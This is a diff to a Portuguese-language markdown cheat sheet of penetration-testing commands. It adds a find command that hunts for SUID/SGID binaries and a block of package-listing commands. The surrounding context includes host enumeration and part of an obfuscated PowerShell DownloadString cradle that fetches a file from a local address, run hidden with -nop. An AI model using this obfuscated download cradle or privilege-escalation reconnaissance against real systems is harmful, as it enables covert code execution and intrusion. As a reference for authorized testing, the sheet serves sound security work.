@@ -19,6 +19,7 @@ env
 hostname
 cat /etc/hosts
 cat /etc/resolv.conf
+find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -lg {} \; >> suid.txt 2>/dev/null
 ``` 
 
 informações de usuários e grupos
@@ -193,8 +194,15 @@ NEt.w`eb`cl`I`EnT).do`wN`LOAdsTRin`g`('http://127.0.0.1/fig1.jpg`'`)"); |
 WindowsPowerShell\v1.0\powershell.exe -nop -win 1 -
 ``` 
 
-```bash
+Pacotes e programas instalados
 
+```bash
+dpkg --get-selections
+apt list --installed
+dnf list installed
+pacman -Q
+flatpak list
+snap list
 ``` 
 
 ```bash
